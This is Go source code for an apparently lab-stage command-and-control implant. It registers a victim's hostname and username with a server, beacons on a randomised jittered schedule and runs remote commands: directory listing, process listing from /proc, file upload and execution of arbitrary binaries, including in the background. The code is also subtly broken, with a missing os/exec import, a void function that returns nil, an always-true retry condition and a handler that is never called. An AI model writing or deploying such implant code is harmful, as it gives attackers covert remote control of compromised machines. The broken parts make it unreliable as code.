package main

import (
	"bytes"
	crand "crypto/rand"  
	"encoding/hex"
	"encoding/json"
	"fmt"
	mathrand "math/rand"  
	"net/http"
	"os"
	"os/user"
	"time"
	"bufio"
    "net"
    "strconv"
    "strings"
)

var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano())) 

type CallbackInfo struct {
	Callback_freq int
	Jitter        int
	SelfTerminate int
}

type InitialInfo struct {
	Session      string `json:"session"`
	Hostname     string `json:"hostname"`
	Username     string `json:"username"`
	Callback_freq int    `json:"callback_freq"`
	Jitter       int    `json:"jitter"`
}

func GatherInfo() InitialInfo {
	bytes := make([]byte, 4)
	_, err := crand.Read(bytes)  
	if err != nil {
		panic(err)
	}
	hexString := hex.EncodeToString(bytes)
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()

	hostInfo := InitialInfo{
		Session:      hexString,
		Hostname:     hostname,
		Username:     currentUser.Username,
		Callback_freq: 1,
		Jitter:       15,
	}
	return hostInfo
}

func CheckIn(serverAddr string, session string) (int, error) {
	url := fmt.Sprintf("%s/health/%s", serverAddr, session)
	resp, err := http.Get(url)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()

	return 200, nil
}

func TerminateImplant() {
	// Get the name of your implant
	// Get the pwd the implant if running from 
	// Check to see if it is on disk, if so remove, if not then just kill yourself
	return nil
}

func PostJson(url string, payload interface{}) (int, error) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return 0, err
	}
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	return resp.StatusCode, nil
}

func RandomJitter(baseMinutes int, jitterPercent int) time.Duration {
	randomPercent := rng.Intn(jitterPercent + 1)
	jitterFraction := float64(randomPercent) / 100.0

	baseSeconds := baseMinutes * 60
	jitterSeconds := int(float64(baseSeconds) * jitterFraction)

	totalSeconds := baseSeconds + jitterSeconds

	jitterDuration := time.Duration(totalSeconds) * time.Second

	fmt.Printf("Random jitter: %d%% (+%ds) → total %s\n", randomPercent, jitterSeconds, jitterDuration)
	return jitterDuration
}

func get_proc_listing() []string {
        dir, err := os.Open("/proc")
        if err != nil {
                return nil
        }
        defer dir.Close()

        files, err := dir.Readdir(-1)
        if err != nil {
                return nil
        }
        var filenames []string
        for _, file := range files {
                filenames = append(filenames, file.Name())
        }
        return filenames

}

func read_proc_file(file_name string) string {
        data, err := os.ReadFile(file_name)
        if err != nil {
                return ""
        }
        content := strings.ReplaceAll(string(data), "\x00", " ") // replace \x00 with space
        return content
}

func get_ps(conn net.Conn) {
        proc_files := get_proc_listing()

        var process_list []string

        for _, name := range proc_files {
                pid, err := strconv.Atoi(name)
                if err != nil {
                        continue
                } else {
                        cmdline_path := fmt.Sprintf("/proc/%d/cmdline", pid)
                        ppid_path := fmt.Sprintf("/proc/%d/status", pid)

                        var cmdline_file_contents string
                        if len(read_proc_file(cmdline_path)) != 0 {
                                cmdline_file_contents = read_proc_file(cmdline_path)
                        } else {
                                cmdline_path := fmt.Sprintf("/proc/%d/status", pid)
                                cmdline_file_contents = read_proc_file(cmdline_path)

                                cmdline_file_lines := strings.Split(cmdline_file_contents, "\n")

                                for _, line := range cmdline_file_lines {
                                        if strings.HasPrefix(line, "Name:") {
                                                parts := strings.Fields(line)
                                                if len(parts) == 2 {
                                                        cmd_line_formatted := fmt.Sprintf("%v%v%v", "[", parts[1], "]")
                                                        cmdline_file_contents = cmd_line_formatted
                                                } else {
                                                        cmdline_file_contents = "?"
                                                }
                                                break
                                        }
                                }
                        }

                        ppid_file_contents := read_proc_file(ppid_path)
                        ppid_lines := strings.Split(ppid_file_contents, "\n")

                        var ppid_value string

                        for _, line := range ppid_lines {
                                if strings.HasPrefix(line, "PPid:") {
                                        parts := strings.Fields(line)
                                        if len(parts) == 2 {
                                                ppid_value = parts[1]
                                        } else {
                                                ppid_value = "?"
                                        }
                                        break
                                }
                        }
                        process_list = append(process_list, fmt.Sprintf("%-7d  %-7s  %s", pid, ppid_value, cmdline_file_contents))
                }
        }
        for _, value := range process_list {
                fmt.Fprintf(conn, "%v\n", value)
        }
        fmt.Fprintf(conn, "__END__\n")
}

func listDirectories(conn net.Conn, path string) {

        dir, err := os.Open(path)
        if err != nil {
                fmt.Fprintf(conn, "[!] %v\n__END__\n", err)
                return
        }
        defer dir.Close()

        files, err := dir.Readdir(-1)
        if err != nil {
                fmt.Fprintf(conn, "[!] %v\n__END__\n", err)
        }
        for _, file := range files {
                line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
                fmt.Fprintf(conn, "%v", line)
        }
        fmt.Fprintf(conn, "__END__\n")
}

func uploadFile(conn net.Conn, remotePath string, fSize string) {
        fileSize, err := strconv.ParseInt(fSize, 10, 64)
        if err != nil {
                fmt.Fprintf(conn, "[!] Invalid file size\n__END__\n")
                return
        }

        file, err := os.OpenFile(remotePath, os.O_CREATE|os.O_WRONLY, 0777)
        if err != nil {
                fmt.Fprintf(conn, "[!] Error creating file at: %v\n__END__\n", err)
                return
        }
        defer file.Close()

        _, err = conn.Write([]byte{'1'})
        if err != nil {
                return
        }

        buffer := make([]byte, 4096)
        totalBytes := int64(0)

        for totalBytes < fileSize {
                n, err := conn.Read(buffer)
                if n > 0 {
                        _, write_err := file.Write(buffer[:n])
                        if write_err != nil {
                                fmt.Fprintf(conn, "[!] Error writing to file: %v\n__END__\n", write_err)
                                return
                        }
                        totalBytes += int64(n)
                }

                if err != nil {
                        fmt.Fprintf(conn, "[!] Error reading from connection: %v\n__END__\n", err)
                        return
                }
        }

        if totalBytes == fileSize {
                fmt.Fprintf(conn, "[+] Success writing data to: %v\n__END__\n", remotePath)

        } else {
                fmt.Fprintf(conn, "[!] File size mismatch: expected %d bytes, recieved %d bytes\n__END__\n", fileSize, totalBytes)
        }
}

func execBinary(conn net.Conn, binPath string, args []string, background bool) {
        binary := exec.Command(binPath, args...)

        var output bytes.Buffer

        if background {
                binary.Stdin = nil
                binary.Stdout, _ = os.Open(os.DevNull)
                binary.Stderr, _ = os.Open(os.DevNull)
        } else {
                binary.Stdin = nil
                binary.Stdout = &output
                binary.Stderr = &output
        }

        err := binary.Start()
        if err != nil {
                fmt.Fprintf(conn, "%v\n__END__\n", err)
                return
        }

        if background {
                fmt.Fprintf(conn, "%s", "[+] Binary executed successfully in background\n__END__\n")
                return
        }

        err = binary.Wait()
        if err != nil {
                fmt.Fprintf(conn, "%v\n__END__\n", err)
                return
        }

        fmt.Fprintf(conn, "%v", output.String())
        fmt.Fprintf(conn, "%s", "__END__\n")

}

func handleConnection(conn net.Conn) {
        defer conn.Close()

        scanner := bufio.NewScanner(conn)

        for scanner.Scan() {
                command := scanner.Text()
                commandParts := strings.Fields(command)
                commandAction := commandParts[0]

                if commandAction == "ls" {
                        path := strings.Join(commandParts[1:], " ")
                        listDirectories(conn, path)
                } else if commandAction == "ps" {
                        get_ps(conn)
                } else if commandAction == "upload" {
                        remotePath := commandParts[1]
                        fileSize := commandParts[2]
                        uploadFile(conn, remotePath, fileSize)
                } else if commandAction == "exec" && commandParts[1] == "-b" {
                        binPath := commandParts[2]
                        args := commandParts[3:]
                        execBinary(conn, binPath, args, true)
                } else if commandAction == "exec" {
                        binPath := commandParts[1]
                        args := commandParts[2:]
                        execBinary(conn, binPath, args, false)

                }
        }
}


func main() {
	fmt.Println("Agent started")

	retryCounter := 0
	serverUrl := "http://127.0.0.1:8000"

	initialInfo := GatherInfo()

	callbackTimer := CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}

	// register with server 
	resp, err := PostJson(serverUrl+"/implants/", initialInfo)
	if err != nil {
		panic(err)
	}
	if resp != 200 {
		fmt.Printf("Response: %v\n", resp)
	}

	for {
		nextInterval := RandomJitter(callbackTimer.Callback_freq, callbackTimer.Jitter)
		timer := time.NewTimer(nextInterval)
		fmt.Printf("Next check-in in %s\n", nextInterval)

		<-timer.C
		resp, err := CheckIn(serverUrl, initialInfo.Session)
		fmt.Println("Check-in fired")
		if resp != 200 || resp != 302 {
			retryCounter += 1
			if retryCounter >= callbackTimer.SelfTerminate {
				TerminateImplant()
			}
		}

		timer.Stop()
	}
}
